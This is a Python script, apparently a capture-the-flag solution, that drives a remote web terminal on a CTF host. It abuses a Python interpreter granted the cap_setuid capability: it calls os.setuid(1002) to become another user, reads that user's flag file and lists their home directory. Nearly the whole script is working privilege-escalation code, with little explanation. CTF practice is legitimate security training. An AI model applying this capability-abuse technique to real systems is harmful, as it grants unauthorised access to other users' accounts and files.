"""Drive the /opt/crypto/pytool Python REPL (cap_setuid=ep) to become deephax."""
import asyncio
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ttyd_client import Shell, decode  # noqa: E402

HOST = "hostbusters.dctf.io"


async def main():
    async with Shell(cols=140, rows=50) as sh:
        # initial banner
        txt = await sh.read(2.5)
        print("--- boot ---")
        print(txt)

        await sh.send("stty echo 2>/dev/null; echo READY")
        print(await sh.read(2.0))

        # launch the tool with the dangerous capability
        await sh.send("/opt/crypto/pytool")
        print("--- tool ---")
        print(await sh.read(3.5))

        # sanity: who am I inside the interpreter?
        await sh.send("import os; print('UID', os.getuid(), 'EUIDS', os.getresuid())")
        print(await sh.read(2.5))

        # escalate to the next user (deephax, uid 1002)
        await sh.send("os.setuid(1002)")
        print(await sh.read(2.0))

        await sh.send("import pwd; print('NOW', pwd.getpwuid(os.getuid()).pw_name)")
        print(await sh.read(2.5))

        # read the flag
        await sh.send(
            "print('FLAG:' + open('/home/deephax/flag.txt').read().strip())"
        )
        print(await sh.read(3.5))

        await sh.send("print('LS:' + repr(os.listdir('/home/deephax')))")
        print(await sh.read(3.0))

        await sh.send("exit()")
        print(await sh.read(2.0))


asyncio.run(main())
